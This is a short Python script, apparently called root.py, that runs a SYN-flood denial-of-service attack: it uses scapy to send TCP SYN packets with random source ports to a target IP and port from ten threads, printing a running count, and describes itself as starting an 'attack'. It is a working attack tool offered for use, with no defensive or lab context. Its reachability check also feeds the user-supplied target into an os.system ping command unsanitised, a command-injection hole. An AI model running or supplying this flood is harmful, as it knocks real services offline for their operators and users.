import sys
import threading
import random
import scapy.all as scapy
import os

# Global Params
target_ip = ''
target_port = 80
request_counter = 0
stop_attack = False

def inc_counter():
    global request_counter
    request_counter += 1

def attack_target():
    global stop_attack
    while not stop_attack:
        src_port = random.randint(1024, 65535)
        packet = scapy.IP(dst=target_ip) / scapy.TCP(sport=src_port, dport=target_port, flags='S')
        scapy.send(packet, verbose=1)  # verbose=1 to see packets
        inc_counter()

def usage():
    print('---------------------------------------------------')
    print('USAGE: python root.py <target_ip> [<target_port>]')
    print('---------------------------------------------------')

def check_target_reachability(target_ip):
    response = os.system("ping -c 1 " + target_ip)
    if response == 0:
        print(f"{target_ip} is reachable.")
    else:
        print(f"{target_ip} is not reachable.")
        sys.exit()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    else:
        target_ip = sys.argv[1]
        if len(sys.argv) == 3:
            target_port = int(sys.argv[2])

        check_target_reachability(target_ip)

        print(f"Starting attack on {target_ip}:{target_port}")

        try:
            for i in range(10):  # Adjust the number of threads based on desired intensity
                t = threading.Thread(target=attack_target)
                t.start()

            while True:
                print(f"Requests Sent: {request_counter}")
                # Optional: Add conditions to stop attack
        except KeyboardInterrupt:
            stop_attack = True
            print("Attack stopped.")
